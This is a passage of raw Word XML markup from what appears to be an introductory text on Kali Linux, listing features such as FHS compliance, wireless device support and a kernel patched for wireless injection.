          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:t>ho wan</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>weak or rebu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>d packa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">es </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o su</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>r spec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>c needs.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="exact"/>
        <w:ind w:left="524"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>FH</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>comp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ant:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="15"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>It</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="15"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>adheres</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="14"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="15"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>F</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:t>esys</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>em</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="15"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>H</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>erarchy</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="15"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>andard,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ow</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>Li</w:t>
      </w:r>
      <w:r>
        <w:t>nux</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="15"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>sers</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="14"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="78"/>
        <w:ind w:left="808"/>
      </w:pPr>
      <w:r>
        <w:t>eas</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>oc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>es, support</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">es, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:t>bra</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>es, e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>c.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="56" w:line="307" w:lineRule="auto"/>
        <w:ind w:left="808" w:right="70" w:hanging="284"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="15"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>de-rang</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ess</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>dev</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ce</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>su</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>port:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>A regu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="15"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>ck</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="15"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>po</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="15"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>Li</w:t>
      </w:r>
      <w:r>
        <w:t>nux</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>ons has been</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>upport</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>for w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ess </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:t>aces. Ka</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>Li</w:t>
      </w:r>
      <w:r>
        <w:t>nux suppor</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>any</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ess dev</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ces.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="exact"/>
        <w:ind w:left="524"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>stom</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>kerne</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="8"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>patched</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>for</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>nject</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>on:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>As</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>pen</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ra</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>es</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ers,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>dev</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>op</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>en</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="78" w:line="288" w:lineRule="auto"/>
        <w:ind w:left="808" w:right="70"/>
      </w:pPr>
      <w:r>
        <w:t>needs</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>do</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="39"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ess</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ass</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>ss</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="39"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Ka</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="41"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>Li</w:t>
      </w:r>
      <w:r>
        <w:t>nux</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="39"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>kern</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="39"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>has</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="41"/>
        </w:rPr>
